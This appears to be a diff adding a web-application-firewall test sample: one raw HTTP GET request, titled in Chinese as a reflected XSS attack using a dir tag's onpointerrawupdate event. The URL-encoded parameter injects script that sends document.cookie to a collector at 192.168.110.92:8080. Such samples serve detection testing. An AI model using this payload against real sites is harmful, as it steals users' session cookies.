@@ -1,0 +1,9 @@
+# XSS跨站脚本_GET_常规_事件_dir标签_onpointerrawupdate事件-06506666
+# 攻击载荷利用了HTML中的dir标签和onpointerrawupdate属性，触发location.href向恶意地址发送cookie信息。当指针改变时触发
+GET /?id=%3Cdir%20onpointerrawupdate=%28location.href=%22http:%2F%2F192.168.110.92:8080%2Findex.jsp%3Fid=%22+document.cookie%29%3Etest%3C%2Fdir%3E&bid=hd_tag_m8mv25rv HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv25rv
+RM-PRO-Token: 14107602b2010f7e44965bd35ca8770a
+RM-PRO-Time: 1742808503961
+User-Agent: curl/7.83.1
+
